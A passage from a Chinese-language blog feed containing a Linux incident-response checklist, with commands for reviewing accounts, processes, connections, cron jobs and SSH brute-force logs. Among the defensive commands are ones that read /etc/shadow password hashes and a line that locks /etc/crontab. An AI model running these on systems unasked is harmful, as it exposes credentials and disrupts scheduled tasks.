class="line">http://www.wiki.yelbee.top/2020/04/30/%E5%8D%93%E6%8A%A4%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/%E5%BA%94%E7%94%A8%E5%8A%A0%E5%9B%BA/4.1%E5%BA%94%E7%94%A8%E5%8A%A0%E5%9B%BA%E6%A6%82%E8%BF%B0/</span><br><span class="line">https://bbs.kanxue.com/thread-274793.htm</span><br><span class="line">https://cloud.tencent.com/developer/article/2284277</span><br><span class="line">https://onejane.github.io/2021/02/21/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3%E4%B9%8B%E5%88%86%E7%B1%BB%E6%8A%80%E6%9C%AF/#%E7%AC%AC%E4%BA%8C%E4%BB%A3%E5%A3%B3-dex%E6%8A%BD%E5%8F%96%E4%B8%8E%E5%8A%A0%E5%9B%BA</span><br><span class="line">https://dun.163.com/news/p/760c8c1ad4ee4349951646d85814264d</span><br><span class="line">https://www.dingxiang-inc.com/blog/post/2</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APP测试系列 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加固史 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 应急响应排查思路</title>
      <link href="/2023/10/22/Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/10/22/Linux%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>应急响应 Linux 篇幅，由于我们平常使用 Windows 系统较为熟练，对于 Linux 平台通常或会仅限于普通服务搭建使用，不会深入的了解其。日常工作会遇到 Linux 服务器的应急响应工作，于是记录下以便后续的工作能顺利的开展。</p><h2 id="二、应急流程"><a href="#二、应急流程" class="headerlink" title="二、应急流程"></a>二、应急流程</h2><p>接到应急事件，应急人员应先充分了解事件详情，具体应急事件的类型是恶意攻击、蠕虫攻击、上级通报还是疑似攻击等。充分了解事件过程对应急排查起关键作用，免得做无用功事。</p><p><strong>应急前期</strong></p><p>开始排查前，应询问是否有安全设备，若有，可通过安全平台针对应急事件类型查看日志获取有用信息，若已捕获相关样本请求提供开展分析。</p><h3 id="1、排查是否有异常的系统用户"><a href="#1、排查是否有异常的系统用户" class="headerlink" title="1、排查是否有异常的系统用户"></a>1、排查是否有异常的系统用户</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看用户</span><br><span class="line">cat /etc/passwd</span><br><span class="line">格式：用户名：密码：用户ID：组ID：用户说明：家（home）目录：登陆之后shell</span><br><span class="line">无密码只允许本机登陆，远程不允许ssh登陆</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124511958.png" data-caption="image-20230215124511958"><img src="/../images/emergency/linux/image-20230215124511958.png" alt="image-20230215124511958"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 查看加密密码</span><br><span class="line">cat /etc/shadow</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留字段</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124605002.png" data-caption="image-20230215124605002"><img src="/../images/emergency/linux/image-20230215124605002.png" alt="image-20230215124605002"></a></p><h3 id="2、排查账号信息（按照实际情况查询）"><a href="#2、排查账号信息（按照实际情况查询）" class="headerlink" title="2、排查账号信息（按照实际情况查询）"></a>2、排查账号信息（按照实际情况查询）</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权账户 &amp; 组</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 可以远程登录的账号</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"></span><br><span class="line"># 查看哪些用户使用shell</span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br><span class="line"></span><br><span class="line"># 查看哪些用户为root权限</span><br><span class="line">cat /etc/passwd | grep x:0</span><br><span class="line"></span><br><span class="line"># 查看除了不可登录以外的用户都有哪些，有没有新增的</span><br><span class="line">cat /etc/passwd | grep -v nologin</span><br><span class="line"></span><br><span class="line"># 查询系统中所有账户</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">who</span><br><span class="line"></span><br><span class="line"># 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">w</span><br><span class="line"></span><br><span class="line"># 查看登陆多久、多少用户，负载</span><br><span class="line">uptime</span><br><span class="line"></span><br><span class="line"># 查看密码文件上一次修改的时间</span><br><span class="line">stat /etc/passwd</span><br><span class="line"></span><br><span class="line"># 查询 sudo 权限账户</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权账户 &amp; 组</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;$3==0&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124650630.png" data-caption="image-20230215124650630"><img src="/../images/emergency/linux/image-20230215124650630.png" alt="image-20230215124650630"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以远程登录的账号</span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124731218.png" data-caption="image-20230215124731218"><img src="/../images/emergency/linux/image-20230215124731218.png" alt="image-20230215124731218"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看哪些用户使用shell</span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124750562.png" data-caption="image-20230215124750562"><img src="/../images/emergency/linux/image-20230215124750562.png" alt="image-20230215124750562"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看哪些用户为root权限</span><br><span class="line">cat /etc/passwd | grep x:0</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124811746.png" data-caption="image-20230215124811746"><img src="/../images/emergency/linux/image-20230215124811746.png" alt="image-20230215124811746"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看除了不可登录以外的用户都有哪些，有没有新增的</span><br><span class="line">cat /etc/passwd | grep -v nologin</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124837096.png" data-caption="image-20230215124837096"><img src="/../images/emergency/linux/image-20230215124837096.png" alt="image-20230215124837096"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询系统中所有账户</span><br><span class="line">cat /etc/passwd | awk -F: &#x27;&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124859476.png" data-caption="image-20230215124859476"><img src="/../images/emergency/linux/image-20230215124859476.png" alt="image-20230215124859476"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前登录用户（tty 本地登陆  pts 远程登录）</span><br><span class="line">who</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124918880.png" data-caption="image-20230215124918880"><img src="/../images/emergency/linux/image-20230215124918880.png" alt="image-20230215124918880"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">w</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124933161.png" data-caption="image-20230215124933161"><img src="/../images/emergency/linux/image-20230215124933161.png" alt="image-20230215124933161"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看登陆多久、多少用户，负载</span><br><span class="line">uptime</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215124949699.png" data-caption="image-20230215124949699"><img src="/../images/emergency/linux/image-20230215124949699.png" alt="image-20230215124949699"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看密码文件上一次修改的时间</span><br><span class="line">stat /etc/passwd</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125006235.png" data-caption="image-20230215125006235"><img src="/../images/emergency/linux/image-20230215125006235.png" alt="image-20230215125006235"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询 sudo 权限账户</span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125030322.png" data-caption="image-20230215125030322"><img src="/../images/emergency/linux/image-20230215125030322.png" alt="image-20230215125030322"></a></p><h3 id="3、排查可疑进程"><a href="#3、排查可疑进程" class="headerlink" title="3、排查可疑进程"></a>3、排查可疑进程</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看全部进程</span><br><span class="line">ps -aux</span><br><span class="line"></span><br><span class="line"># 查看关联进程</span><br><span class="line">ps -aux | grep pid</span><br><span class="line"></span><br><span class="line"># 查看cpu占用情况（动态）</span><br><span class="line">top -c -o %CPU</span><br><span class="line"></span><br><span class="line"># 查看CPU占用前十的进程</span><br><span class="line">ps -eo user,pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 10</span><br><span class="line"></span><br><span class="line"># 按CPU 使用率从高到底排序</span><br><span class="line">ps -ef --sort -pcpu</span><br><span class="line"></span><br><span class="line"># 按内存从高到低</span><br><span class="line">ps -ef --sort -pmem</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125108596.png" data-caption="image-20230215125108596"><img src="/../images/emergency/linux/image-20230215125108596.png" alt="image-20230215125108596"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125313535.png" data-caption="image-20230215125313535"><img src="/../images/emergency/linux/image-20230215125313535.png" alt="image-20230215125313535"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125332381.png" data-caption="image-20230215125332381"><img src="/../images/emergency/linux/image-20230215125332381.png" alt="image-20230215125332381"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125404019.png" data-caption="image-20230215125404019"><img src="/../images/emergency/linux/image-20230215125404019.png" alt="image-20230215125404019"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125434353.png" data-caption="image-20230215125434353"><img src="/../images/emergency/linux/image-20230215125434353.png" alt="image-20230215125434353"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125511429.png" data-caption="image-20230215125511429"><img src="/../images/emergency/linux/image-20230215125511429.png" alt="image-20230215125511429"></a></p><h3 id="4、定位可疑程序路径"><a href="#4、定位可疑程序路径" class="headerlink" title="4、定位可疑程序路径"></a>4、定位可疑程序路径</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定位可疑进程的程序是什么</span><br><span class="line">ps -ef | grep pid号</span><br><span class="line"></span><br><span class="line"># 定位可疑进程文件位置</span><br><span class="line">lsof -p PID</span><br><span class="line">ls -al /proc/9109/exe </span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125557765.png" data-caption="image-20230215125557765"><img src="/../images/emergency/linux/image-20230215125557765.png" alt="image-20230215125557765"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125626387.png" data-caption="image-20230215125626387"><img src="/../images/emergency/linux/image-20230215125626387.png" alt="image-20230215125626387"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125646608.png" data-caption="image-20230215125646608"><img src="/../images/emergency/linux/image-20230215125646608.png" alt="image-20230215125646608"></a></p><h3 id="5、排查外联情况"><a href="#5、排查外联情况" class="headerlink" title="5、排查外联情况"></a>5、排查外联情况</h3><p><strong>lsof</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 显示已建立连接信息</span><br><span class="line">lsof -i -sTCP:ESTABLISHED</span><br><span class="line"></span><br><span class="line"># 显示正在监听的端</span><br><span class="line">lsof -i -sTCP:LISTEN</span><br><span class="line"></span><br><span class="line"># 查看端口绑定的应用</span><br><span class="line">lsof -i :22</span><br><span class="line"></span><br><span class="line"># 显示指定主机连接的信息</span><br><span class="line">lsof -i@1.1.1.1</span><br><span class="line"></span><br><span class="line"># 显示基于主机与端口连接的信息</span><br><span class="line">lsof -i@1.1.1.1:3333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125723942.png" data-caption="image-20230215125723942"><img src="/../images/emergency/linux/image-20230215125723942.png" alt="image-20230215125723942"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125742962.png" data-caption="image-20230215125742962"><img src="/../images/emergency/linux/image-20230215125742962.png" alt="image-20230215125742962"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125809753.png" data-caption="image-20230215125809753"><img src="/../images/emergency/linux/image-20230215125809753.png" alt="image-20230215125809753"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125830517.png" data-caption="image-20230215125830517"><img src="/../images/emergency/linux/image-20230215125830517.png" alt="image-20230215125830517"></a></p><p><strong>netstat</strong></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查看端口开放和连接情况</span><br><span class="line">netstat -pantu</span><br><span class="line">netstat -anulpt</span><br><span class="line"></span><br><span class="line"># 指定tcp进程</span><br><span class="line">netstat -tnap</span><br><span class="line"></span><br><span class="line"># 指定udp进程</span><br><span class="line">netstat -unap</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125851015.png" data-caption="image-20230215125851015"><img src="/../images/emergency/linux/image-20230215125851015.png" alt="image-20230215125851015"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125909675.png" data-caption="image-20230215125909675"><img src="/../images/emergency/linux/image-20230215125909675.png" alt="image-20230215125909675"></a></p><h3 id="6、监控指定IP的通讯进程"><a href="#6、监控指定IP的通讯进程" class="headerlink" title="6、监控指定IP的通讯进程"></a>6、监控指定IP的通讯进程</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true; do netstat -antp | grep 10.10.10.1; done</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215125955194.png" data-caption="image-20230215125955194"><img src="/../images/emergency/linux/image-20230215125955194.png" alt="image-20230215125955194"></a></p><h3 id="7、排查自启项"><a href="#7、排查自启项" class="headerlink" title="7、排查自启项"></a>7、排查自启项</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有的服务项目</span><br><span class="line">systemctl list-unit-files</span><br><span class="line"></span><br><span class="line"># 过滤出所有的开机启动的项目</span><br><span class="line">systemctl list-unit-files |grep enabled</span><br><span class="line"></span><br><span class="line"># 查看开机启动项目</span><br><span class="line">chkconfig </span><br><span class="line"></span><br><span class="line"># 查看服务自启状态</span><br><span class="line">chkconfig  --list</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130021004.png" data-caption="image-20230215130021004"><img src="/../images/emergency/linux/image-20230215130021004.png" alt="image-20230215130021004"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130044082.png" data-caption="image-20230215130044082"><img src="/../images/emergency/linux/image-20230215130044082.png" alt="image-20230215130044082"></a></p><h3 id="8、排查计划任务"><a href="#8、排查计划任务" class="headerlink" title="8、排查计划任务"></a>8、排查计划任务</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 查看计划任务</span><br><span class="line">crontab  -l</span><br><span class="line"></span><br><span class="line"># 查看指定用户计划任务</span><br><span class="line">crontab -u 用户名 -l</span><br><span class="line"></span><br><span class="line"># 查看计划任务</span><br><span class="line">cat /var/spool/cron/* # centos</span><br><span class="line">cat /var/spool/cron/crontabs/* # ubuntu的</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/cron.d/*</span><br><span class="line">cat /etc/cron.daily/* </span><br><span class="line">cat /etc/cron.hourly/* </span><br><span class="line">cat /etc/cron.monthly/*</span><br><span class="line">cat /etc/cron.weekly/</span><br><span class="line">cat /etc/anacrontab # 异步定时</span><br><span class="line">cat /var/spool/anacron/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cat crontab  -l # 查看定时任务</span><br><span class="line">cat crontab –e # 编辑定时任务</span><br><span class="line">ls /var/spool/cron/  #查看每个用户自己的执行计划</span><br><span class="line">sed &#x27;/gcc.sh/d&#x27; /etc/crontab &amp;&amp; chmod 0000 /etc/crontab &amp;&amp; chattr +i /etc/crontab   #删除计划任务且控制计划任务不能写东西，慎用。</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130509214.png" data-caption="image-20230215130509214"><img src="/../images/emergency/linux/image-20230215130509214.png" alt="image-20230215130509214"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130538066.png" data-caption="image-20230215130538066"><img src="/../images/emergency/linux/image-20230215130538066.png" alt="image-20230215130538066"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130627186.png" data-caption="image-20230215130627186"><img src="/../images/emergency/linux/image-20230215130627186.png" alt="image-20230215130627186"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130643200.png" data-caption="image-20230215130643200"><img src="/../images/emergency/linux/image-20230215130643200.png" alt="image-20230215130643200"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130731090.png" data-caption="image-20230215130731090"><img src="/../images/emergency/linux/image-20230215130731090.png" alt="image-20230215130731090"></a></p><h3 id="9、排查环境变量"><a href="#9、排查环境变量" class="headerlink" title="9、排查环境变量"></a>9、排查环境变量</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130754649.png" data-caption="image-20230215130754649"><img src="/../images/emergency/linux/image-20230215130754649.png" alt="image-20230215130754649"></a></p><h3 id="10、查看host文件是否被篡改"><a href="#10、查看host文件是否被篡改" class="headerlink" title="10、查看host文件是否被篡改"></a>10、查看host文件是否被篡改</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/linux/image-20230215130816251.png" data-caption="image-20230215130816251"><img src="/../images/emergency/linux/image-20230215130816251.png" alt="image-20230215130816251"></a></p><h3 id="11、可疑文件排查"><a href="#11、可疑文件排查" class="headerlink" title="11、可疑文件排查"></a>11、可疑文件排查</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查找指定目录下的指定时间下生产的文件</span><br><span class="line">find /指定路径 -name &quot;*.jsp&quot; -newermt &quot;2023-10-01 00:00:00&quot; ! -newermt &quot;2024-01-01 00:00:00&quot; -exec ls -l &#123;&#125; \; &gt; /保存路径/result.txt</span><br><span class="line"></span><br><span class="line"># 全局搜索指定文件名后缀</span><br><span class="line">find / -name &quot;*.log&quot;</span><br><span class="line"></span><br><span class="line"># 指定时间段内搜索具有 &quot;.log&quot; 扩展名的文件</span><br><span class="line">find / -name &quot;*.log&quot; -exec grep -E &quot;^(YYYY-MM-DD HH:MM:SS|YYYY-MM-DD HH:MM:SS)&quot; &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"># 全局搜索指定时间段生成的文件</span><br><span class="line">find / -type f -newermt &quot;2022-01-01 00:00:00&quot; ! -newermt &quot;2023-12-31 23:59:59&quot; -exec ls -l --time-style=long-iso &#123;&#125; \; &gt;&gt; search_results.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure></div><h3 id="12、排查日志"><a href="#12、排查日志" class="headerlink" title="12、排查日志"></a>12、排查日志</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 终端输出指定日志指定时间的日志</span><br><span class="line">cat /var/log/syslog | grep &quot;YYYY-MM-DD HH:MM:SS&quot;</span><br><span class="line"></span><br><span class="line"># 终端输出日志中指定 ip 的日志</span><br><span class="line">cat /var/log/syslog | grep &quot;外部IP地址&quot;</span><br><span class="line"></span><br><span class="line"># 统计爆破主机root账号的失败次数及ip</span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line"># 定位哪些IP在爆破</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line"># 查看成功登录的日期、用户名、IP</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># 爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr </span><br><span class="line"></span><br><span class="line"># 日志默认存放位置</span><br><span class="line">/var/log</span><br><span class="line"></span><br><span class="line"># 查看日志配置情况</span><br><span class="line">more /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line"># 登录日志记录</span><br><span class="line">/var/log/secure</span><br><span class="line"></span><br><span class="line"># 登录失败记录</span><br><span 